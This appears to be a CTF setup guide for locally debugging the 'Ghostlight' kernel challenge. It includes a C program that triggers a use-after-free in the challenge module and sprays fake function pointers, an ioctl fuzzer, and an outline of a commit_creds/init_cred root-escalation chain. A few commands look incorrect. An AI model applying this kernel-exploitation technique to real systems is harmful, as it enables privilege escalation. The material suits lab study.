# Local Testing Environment Setup Guide

This guide will help you set up a local environment to debug the Ghostlight kernel exploit reliably.

## Prerequisites

### 1. Kernel Version Matching
The remote service runs: `6.1.0-40-cloud-amd64`

You need a Debian-based system with a similar kernel:
```bash
# Install kernel source and headers
sudo apt update
sudo apt install linux-source linux-headers-$(uname -r) build-essential
```

### 2. Tools Needed
```bash
# Install essential tools
sudo apt install build-essential gdb vim qemu-system-x86 kgdb

# For debugging
sudo apt install crash systemtap
```

## Option 1: VM/QEMU Setup (Recommended)

### Step 1: Download Debian Cloud Image
```bash
cd ~/ctf/ghostlight_local
curl -O https://cloud.debian.org/civm/images/cloud/bullseye/latest/debian-11-genericcloud-amd64.qcow2
```

### Step 2: Create VM with Custom Kernel
```bash
# Copy the image
cp debian-11-genericcloud-amd64.qcow2 debian-test.qcow2
qemu-img resize debian-test.qcow2 20G

# Boot and install necessary packages
qemu-system-x86_64 \
  -m 4G \
  -smp 2 \
  -hda debian-test.qcow2 \
  -net user,hostfwd=tcp::2222-:22 \
  -net nic \
  -enable-kvm \
  -kernel /boot/vmlinuz-$(uname -r) \
  -initrd /boot/initrd.img-$(uname -r) \
  -append "root=/dev/sda1 console=ttyS0"
```

### Step 3: Enable KGDB (Kernel Debugging)

In the VM, edit `/etc/default/grub`:
```bash
GRUB_CMDLINE_LINUX_DEFAULT="nokaslr kgdbwait kgdboc=ttyS1,115200"
```

Then update grub:
```bash
sudo update-grub
sudo reboot
```

On host, connect with:
```bash
sudo screen /dev/pts/X 115200  # Replace X with your PTY
```

## Option 2: Docker Container (Easier but Limited)

```bash
# Create Dockerfile
cat > Dockerfile <<'EOF'
FROM debian:bullseye-slim

RUN apt-get update && apt-get install -y \
    build-essential \
    linux-headers-generic \
    kmod \
    gdb

WORKDIR /root/ghostlight
COPY . .

CMD ["/bin/bash"]
EOF

# Build and run
docker build -t ghostlight-test .
docker run --privileged -it -v $(pwd):/root/ghostlight ghostlight-test
```

## Option 3: Local Kernel Module Testing (Simplest)

### Step 1: Build the Module

```bash
cd /home/sean/ctf/Collection/active/Ghostlight/opt/ghostlight/module

# Create test Makefile
cat > Makefile.local <<'EOF'
obj-m += ghostlight.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

load: all
	sudo insmod ghostlight.ko
	sudo mknod /dev/ghostlight c 10 125 2>/dev/null || true
	ls -la /dev/ghostlight

unload:
	sudo rmmod ghostlight
	sudo rm /dev/ghostlight

reload: unload load
	@echo "Module reloaded"
EOF
```

### Step 2: Build and Load

```bash
# Build the module
make -f Makefile.local

# Load it (requires root)
sudo make -f Makefile.local load

# Check syslog
dmesg | tail -20
```

You should see:
```
ghostlight: loaded. device=/dev/ghostlight (kprobe on __x64_sys_getpid)
```

### Step 3: Test Basic Functionality

```bash
# Build ghostctl
cd ../tools
gcc -o ghostctl ghostctl.c

# Test commands
./ghostctl hookon
echo $?  # Should return 0

./ghostctl arm 0x4141414141414141
echo $?

./ghostctl spray 100 0x4141414141414141 0x4242424242424242
echo $?

./ghostctl free
echo $?

sudo rmmod ghostlight
dmesg | tail -5
```

### Step 4: Create Test Exploit

Create a test program to verify UAF:

```c
// test_uaf.c
#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define GHOST_IOC_MAGIC 'G'
#define GHOST_IOC_ARM    _IOW(GHOST_IOC_MAGIC, 0x01, unsigned long)
#define GHOST_IOC_FREE   _IO(GHOST_IOC_MAGIC, 0x02)
#define GHOST_IOC_SPRAY  _IOW(GHOST_IOC_MAGIC, 0x03, unsigned long)
#define GHOST_IOC_HOOKON _IO(GHOST_IOC_MAGIC, 0x04)

struct spray_req {
    unsigned int count;
    unsigned long fn;
    unsigned long arg;
};

int main() {
    int fd = open("/dev/ghostlight", O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    printf("[+] Testing UAF...\n");

    // ARM
    if (ioctl(fd, GHOST_IOC_ARM, 0x4141414141414141) < 0) {
        perror("arm");
        return 1;
    }
    printf("[+] ARM complete\n");

    // HOOKON
    if (ioctl(fd, GHOST_IOC_HOOKON, 0) < 0) {
        perror("hookon");
        return 1;
    }
    printf("[+] HOOKON complete\n");

    // FREE - creates UAF
    if (ioctl(fd, GHOST_IOC_FREE, 0) < 0) {
        perror("free");
        return 1;
    }
    printf("[+] FREE complete (UAF created)\n");

    // SPRAY
    struct spray_req req = {
        .count = 1000,
        .fn = 0xffffffff12345678,  // Replace with actual address
        .arg = 0xffffffff87654321
    };
    if (ioctl(fd, GHOST_IOC_SPRAY, (unsigned long)&req) < 0) {
        perror("spray");
        return 1;
    }
    printf("[+] SPRAY complete\n");

    close(fd);
    printf("[+] Test complete - check dmesg for issues\n");
    return 0;
}
```

Build and run:
```bash
gcc -o test_uaf test_uaf.c
sudo ./test_uaf
dmesg | tail -20
```

## Step 5: Systematic Testing Script

Create a debugging script to test different configurations:

```bash
#!/bin/bash
# test_exploit_local.sh

HOST=localhost
PORT=9999

echo "[*] Building test service..."
gcc -o ghostlight_service ghostlight_service.c

# Start service in background
./ghostlight_service &
SERVICE_PID=$!
sleep 2

echo "[*] Testing exploit..."
python3 exploit_local.py

# Cleanup
kill $SERVICE_PID 2>/dev/null
wait $SERVICE_PID 2>/dev/null
```

## Step 6: Kernel Debugging

Enable detailed kernel memory debugging:

```bash
# Enable slab debugging
echo 1 > /sys/kernel/slab/

# Watch kmalloc-64 specifically
echo 'p kmalloc+0x20
commands
info registers
x/4gx $rdi
continue
end' > /tmp/kmalloc.gdb

gdb -x /tmp/kmalloc.gdb /usr/src/linux/vmlinux
```

## Step 7: Fuzzing the IOCTL

Create a fuzzer to find edge cases:

```python
# fuzz_ghostlight.py
import os
import fcntl
import struct
import random

fd = os.open("/dev/ghostlight", os.O_RDONLY)

def fuzz_arm():
    arg = random.getrandbits(64)
    try:
        fcntl.ioctl(fd, 0x40084701, arg)
        print(f"ARM({arg:x}) = OK")
    except:
        print(f"ARM({arg:x}) = FAIL")

def fuzz_spray():
    count = random.randint(1, 5000)
    fn = random.getrandbits(64)
    arg = random.getrandbits(64)
    req = struct.pack("<IQQ", count, fn, arg)
    try:
        fcntl.ioctl(fd, 0x40084703, req)
        print(f"SPRAY({count}, {fn:x}, {arg:x}) = OK")
    except:
        print(f"SPRAY({count}, ...) = FAIL")

def fuzz_all():
    # Test ARM
    fuzz_arm()

    # Test HOOKON
    try:
        fcntl.ioctl(fd, 0x00004704, 0)
        print("HOOKON = OK")
    except:
        print("HOOKON = FAIL")

    # Test SPRAY
    fuzz_spray()

    # Test FREE
    try:
        fcntl.ioctl(fd, 0x00004702, 0)
        print("FREE = OK")
    except:
        print("FREE = FAIL")

    # Test HOOKOFF
    try:
        fcntl.ioctl(fd, 0x00004705, 0)
        print("HOOKOFF = OK")
    except:
        print("HOOKOFF = FAIL")

for i in range(100):
    print(f"\n--- Round {i} ---")
    fuzz_all()

os.close(fd)
```

## Expected Results

A working exploit should:
1. Use ARM to allocate gl_ctx
2. Use HOOKON to register kprobe
3. Use FREE to create UAF
4. Use SPRAY with commit_creds/init_cred addresses
5. Trigger getpid (via poke or naturally)
6. Cause root escalation
7. Get flag when service finalizes

## Troubleshooting

If the module won't load:
```bash
# Check kernel version matches
uname -r
# Should be 6.1.0 or very close

# Check for symbols
grep commit_creds /proc/kallsyms
grep init_cred /proc/kallsyms

# Check kernel config
cat /boot/config-$(uname -r) | grep CONFIG_KPROBES
```

## Resources Needed

1. [Linux Kernel Module Programming Guide](https://sysprog21.github.io/lkmpg/)
2. [Kernel Debugging with KGDB](https://www.kernel.org/doc/html/latest/dev-tools/kgdb.html)
3. [Exploiting Linux Kernel Heap](https://github.com/h0mbre/kernel-exploitation-notes)

## Notes

- Always work with root privileges when loading kernel modules
- Have a backup kernel or recovery plan
- Document which configurations work/fail
- Test incrementally - don't jump to full exploit immediately

---

This setup will let you debug heap behavior, verify the UAF, and test exploitation reliability in a controlled environment.
